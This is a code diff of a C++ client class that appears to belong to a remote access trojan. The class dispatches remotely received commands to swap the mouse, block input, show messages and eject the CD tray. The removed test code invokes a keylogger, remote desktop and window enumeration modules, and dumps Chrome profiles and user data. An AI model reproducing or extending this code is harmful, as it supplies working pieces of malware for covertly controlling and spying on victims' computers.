@@ -156,29 +156,11 @@ Cliente::Cliente() {
 }
 
 void Cliente::TEST() {
-    //this->mod_Fun = new modFun();
-//this->mod_Key = new mod_Keylogger();
-//this->mod_Key->Start();
-/* this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
- for (auto mon : this->mod_RemoteDesk->m_ListaMonitores()) {
-     std::cout << mon.szDevice << "\t" << mon.rectData.resWidth << "x" << mon.rectData.resHeight << "\n";
- }*/
- /*this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
- for (VentanaInfo ventana : this->mod_AdminVen->m_ListaVentanas()) {
-     std::cout << "TITLE: " << ventana.strTitle << "\n";
-     std::cout << "HWND: " << ventana.hwnd<< "\n";
-     std::cout << "ACTIVE: " << ventana.active<< "\n";
- }*/
-
-    this->mod_Inf0 = new mod_Info();
-
-    for (Chrome_Profile& prof : this->mod_Inf0->m_ChromeProfiles()) {
-        std::cout << prof.strGaiaName << "\n";
-        std::cout << prof.strPath << "\n";
-    }
-
-    std::cout << this->mod_Inf0->m_GetUsersData();
+    this->mod_Fun = new modFun(this->hUser23DLL);
+    this->mod_Fun->m_CD(TRUE);
+    this->mod_Fun->m_Msg("1337 :v", "Testing", MB_ICONERROR);
 }
+
 Cliente::~Cliente() {
 	this->CerrarConexion();
     this->DestroyClasses();
@@ -1064,7 +1046,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - swap mouse
     if (iComando == EnumComandos::Fun_Swap_Mouse) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun();
+            this->mod_Fun = new modFun(this->hUser23DLL);
         }
         BOOL _swap = atoi(paquete.cBuffer.data());
         this->mod_Fun->m_SwapMouse(_swap);
@@ -1074,7 +1056,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - block input
     if (iComando == EnumComandos::Fun_Block_Input) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun();
+            this->mod_Fun = new modFun(this->hUser23DLL);
         }
         BOOL _block = atoi(paquete.cBuffer.data());
         this->mod_Fun->m_BlockInput(_block);
@@ -1084,7 +1066,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - msg
     if (iComando == EnumComandos::Fun_Msg) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun();
+            this->mod_Fun = new modFun(this->hUser23DLL);
         }
         std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "<ravdo>", 3);
         if (vcData.size() == 3) {
@@ -1101,7 +1083,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - cd
     if (iComando == EnumComandos::Fun_CD) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun();
+            this->mod_Fun = new modFun(this->hUser23DLL);
         }
         BOOL _open = atoi(paquete.cBuffer.data());
         this->mod_Fun->m_CD(_open);
